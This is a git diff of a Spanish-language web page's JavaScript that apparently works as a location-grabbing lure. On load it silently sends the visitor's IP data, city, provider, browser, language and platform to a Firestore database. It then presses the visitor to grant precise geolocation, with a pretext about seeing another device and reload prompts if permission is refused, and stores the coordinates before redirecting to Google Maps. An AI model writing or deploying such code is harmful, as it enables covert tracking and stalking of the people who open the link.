@@ -93,7 +93,7 @@ iframe{
     </div>
 </div>
 
-<script type="module">
+        <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
 import {
@@ -118,31 +118,64 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 const estado = document.getElementById("estado");
 
-// ---------- VARIABLES GLOBALES ----------
 let docId = null;
 let datosIP = {};
 let ubicacionObtenida = false;
-let solicitudEnProgreso = false; // para evitar múltiples solicitudes simultáneas
+let solicitudEnProgreso = false;
 
-// ---------- MOSTRAR / CERRAR MODAL ----------
+const modal = document.getElementById("miAlerta");
+const textoAlerta = document.getElementById("textoAlerta");
+const btnAceptar = document.getElementById("btnAceptar");
+
 function mostrarAlerta(texto) {
-    document.getElementById("textoAlerta").textContent = texto;
-    document.getElementById("miAlerta").style.display = "flex";
+    textoAlerta.textContent = texto;
+    modal.style.display = "flex";
 }
 
-function cerrarAlerta() {
-    document.getElementById("miAlerta").style.display = "none";
-    if (!ubicacionObtenida && !solicitudEnProgreso) {
-        // Esperar un breve instante y reintentar
-        setTimeout(() => {
-            solicitarUbicacion();
-        }, 300);
+function ocultarAlerta() {
+    modal.style.display = "none";
+}
+
+btnAceptar.addEventListener("click", async function() {
+    ocultarAlerta();
+    if (ubicacionObtenida) return;
+
+    if (navigator.permissions && navigator.permissions.query) {
+        try {
+            const permiso = await navigator.permissions.query({ name: 'geolocation' });
+            if (permiso.state === 'granted') {
+                solicitarUbicacion();
+                return;
+            } else if (permiso.state === 'denied') {
+                mostrarAlerta("Permiso denegado. Activa la ubicación en los ajustes de tu navegador y recarga la página.");
+                agregarBotonRecargar();
+                return;
+            }
+        } catch (e) {
+            console.warn("No se pudo consultar permisos, se intentará solicitar");
+        }
     }
+    solicitarUbicacion();
+});
+
+function agregarBotonRecargar() {
+    if (document.getElementById("btnRecargar")) return;
+    const btnRecargar = document.createElement("button");
+    btnRecargar.id = "btnRecargar";
+    btnRecargar.textContent = "Recargar página";
+    btnRecargar.style.marginLeft = "10px";
+    btnRecargar.style.backgroundColor = "#075E54";
+    btnRecargar.style.color = "#fff";
+    btnRecargar.style.border = "none";
+    btnRecargar.style.padding = "10px 20px";
+    btnRecargar.style.borderRadius = "8px";
+    btnRecargar.style.cursor = "pointer";
+    btnRecargar.addEventListener("click", function() {
+        window.location.reload();
+    });
+    btnAceptar.parentNode.insertBefore(btnRecargar, btnAceptar.nextSibling);
 }
 
-document.getElementById("btnAceptar").addEventListener("click", cerrarAlerta);
-
-// ---------- OBTENER DATOS DE IP ----------
 async function obtenerDatosIP() {
     try {
         const respuesta = await fetch("https://ipapi.co/json/");
@@ -169,16 +202,10 @@ async function obtenerDatosIP() {
     }
 }
 
-// ---------- GUARDAR DOCUMENTO INICIAL (IP + navegador) ----------
 async function guardarDatosIniciales() {
     try {
         const docRef = await addDoc(collection(db, "ubicaciones"), {
-            ip: datosIP.ip,
-            ciudad: datosIP.ciudad,
-            region: datosIP.region,
-            pais: datosIP.pais,
-            proveedor: datosIP.proveedor,
-            zonaHoraria: datosIP.zonaHoraria,
+            ...datosIP,
             userAgent: navigator.userAgent,
             idioma: navigator.language,
             plataforma: navigator.platform,
@@ -201,22 +228,16 @@ async function guardarDatosIniciales() {
     }
 }
 
-// ---------- ACTUALIZAR CON UBICACIÓN ----------
 async function actualizarConUbicacion(posicion) {
-    if (!docId) {
-        console.error("No hay docId para actualizar");
-        return false;
-    }
+    if (!docId) return false;
     try {
-        const docRef = doc(db, "ubicaciones", docId);
-        await updateDoc(docRef, {
+        await updateDoc(doc(db, "ubicaciones", docId), {
             lat: posicion.coords.latitude,
             lon: posicion.coords.longitude,
             precision: posicion.coords.accuracy,
             ubicacion_obtenida: true,
             fecha_ubicacion: serverTimestamp()
         });
-        console.log("Ubicación actualizada en documento", docId);
         return true;
     } catch (error) {
         console.error("Error al actualizar con ubicación:", error);
@@ -224,27 +245,24 @@ async function actualizarConUbicacion(posicion) {
     }
 }
 
-// ---------- SOLICITAR UBICACIÓN (con manejo de permisos) ----------
 function solicitarUbicacion() {
     if (!navigator.geolocation) {
         mostrarAlerta("Tu navegador no soporta geolocalización.");
         return;
     }
-
-    // Evitar múltiples solicitudes simultáneas
-    if (solicitudEnProgreso) return;
+    if (solicitudEnProgreso || ubicacionObtenida) return;
     solicitudEnProgreso = true;
-
     estado.textContent = "📍 Solicitando permiso de ubicación...";
 
     navigator.geolocation.getCurrentPosition(
-        async function(posicion) {
+        async (posicion) => {
             solicitudEnProgreso = false;
             ubicacionObtenida = true;
             estado.textContent = "📍 Ubicación obtenida, actualizando...";
             const actualizado = await actualizarConUbicacion(posicion);
             if (actualizado) {
                 estado.textContent = "✅ Información completa guardada. Abriendo Google Maps...";
+                ocultarAlerta();
                 const lat = posicion.coords.latitude;
                 const lon = posicion.coords.longitude;
                 setTimeout(() => {
@@ -252,15 +270,16 @@ function solicitarUbicacion() {
                 }, 2500);
             } else {
                 estado.textContent = "⚠️ No se pudo actualizar la ubicación.";
-                // Opcional: mostrar modal de error de guardado
+                mostrarAlerta("Error al guardar la ubicación. Intenta de nuevo.");
             }
         },
-        function(error) {
+        (error) => {
             solicitudEnProgreso = false;
             let mensaje = "";
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    mensaje = "Activa la ubicación para ver otro dispositivo.";
+                    mensaje = "Activa la ubicación en los ajustes del navegador y recarga la página.";
+                    agregarBotonRecargar();
                     break;
                 case error.POSITION_UNAVAILABLE:
                     mensaje = "No fue posible obtener la ubicación.";
@@ -271,64 +290,44 @@ function solicitarUbicacion() {
                 default:
                     mensaje = "Ocurrió un error desconocido.";
             }
-            // Mostrar modal solo si la ubicación no se ha obtenido previamente
             if (!ubicacionObtenida) {
                 mostrarAlerta(mensaje);
             }
             estado.textContent = "⚠️ " + mensaje;
         },
-        {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        }
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 }
 
-// ---------- VERIFICAR PERMISO DE UBICACIÓN ANTES DE SOLICITAR ----------
-async function verificarYActuar() {
-    // Si el navegador soporta la API de permisos, la usamos
-    if (navigator.permissions && navigator.permissions.query) {
-        try {
-            const permiso = await navigator.permissions.query({ name: 'geolocation' });
-            if (permiso.state === 'granted') {
-                // Ya tiene permiso → solicitar ubicación directamente
-                solicitarUbicacion();
-                return;
-            } else if (permiso.state === 'denied') {
-                // Permiso denegado → mostrar modal
-                mostrarAlerta("Activa la ubicación en los ajustes de tu navegador y luego haz clic en Aceptar.");
-                estado.textContent = "⚠️ Permiso de ubicación denegado.";
-                return;
-            }
-            // Si es 'prompt' (aún no decidido), se dejará que el navegador pregunte
-        } catch (e) {
-            console.warn("No se pudo consultar permisos, se procederá con la solicitud normal.");
-        }
-    }
-    // Si no se pudo verificar o el estado es prompt, solicitamos directamente
-    solicitarUbicacion();
-}
-
-// ---------- FLUJO PRINCIPAL ----------
 (async function main() {
-    // 1. Obtener IP
     estado.textContent = "🌐 Obteniendo datos de IP...";
     datosIP = await obtenerDatosIP();
-
-    // 2. Guardar documento inicial
     const guardado = await guardarDatosIniciales();
     if (!guardado) {
         estado.textContent = "⚠️ Error crítico al guardar. Recarga la página.";
         return;
     }
 
-    // 3. Verificar permiso y solicitar ubicación
-    await verificarYActuar();
+    if (navigator.permissions && navigator.permissions.query) {
+        try {
+            const permiso = await navigator.permissions.query({ name: 'geolocation' });
+            if (permiso.state === 'granted') {
+                solicitarUbicacion();
+                return;
+            } else if (permiso.state === 'denied') {
+                mostrarAlerta("Permiso de ubicación denegado. Actívalo en los ajustes del navegador y recarga la página.");
+                agregarBotonRecargar();
+                estado.textContent = "⚠️ Permiso de ubicación denegado.";
+                return;
+            }
+        } catch (e) {
+            console.warn("No se pudo consultar permisos, se solicitará directamente");
+        }
+    }
+    solicitarUbicacion();
 })();
 
-</script>
-
+</script>    
 </body>
 </html>
             
